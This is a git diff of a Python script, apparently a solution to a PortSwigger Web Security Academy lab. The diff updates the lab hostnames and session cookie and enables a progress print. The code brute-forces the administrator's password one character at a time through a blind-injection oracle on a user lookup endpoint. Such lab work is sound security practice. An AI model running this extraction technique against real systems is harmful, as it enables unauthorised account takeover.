@@ -3,10 +3,10 @@ import urllib
 
 def send_request(user: str) -> str:
     data = { 'user': user }
-    cookies = {'session': 'DxhMYIJIqPs5643ayabcGgqWBKIMljBq'}
+    cookies = {'session': 'G8Nb93b7ibgNe7ZBo165rRVUDXEUHefi'}
     headers = {
-        'Referer': 'https://0a460043035a843f807a4f0b005300c6.web-security-academy.net/my-account?id=wiener/my-account?id=wiener',
-        'Host': '0a8c00a803580a1280b14426002d0095.web-security-academy.net',
+        'Referer': 'https://0aa100f304214db3838ba53f00550033.web-security-academy.net/my-account?id=wiener/my-account?id=wiener',
+        'Host': '0aa100f304214db3838ba53f00550033.web-security-academy.net',
         'Sec-Ch-Ua-Platform': '"Linux"',
         'Accept-Language': 'en-US,en;q=0.9',
         'Sec-Ch-Ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
@@ -18,7 +18,7 @@ def send_request(user: str) -> str:
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Dest': 'empty'
     }
-    response = requests.get('https://0a460043035a843f807a4f0b005300c6.web-security-academy.net/user/lookup?user=administrator', params = data, cookies = cookies, headers = headers)
+    response = requests.get('https://0aa100f304214db3838ba53f00550033.web-security-academy.net/user/lookup?user=administrator', params = data, cookies = cookies, headers = headers)
     return response.text
 
 
@@ -46,6 +46,6 @@ for password_index in range(0, password_length):
     for char in alphabet:
         if check_password_char_at_index(char, password_index):
             password_prefix += char 
-            # print(f'{password_index = }: {char = }')
+            print(f'{password_index = }: {char = }')
             break
 print(f'{password_prefix = }')
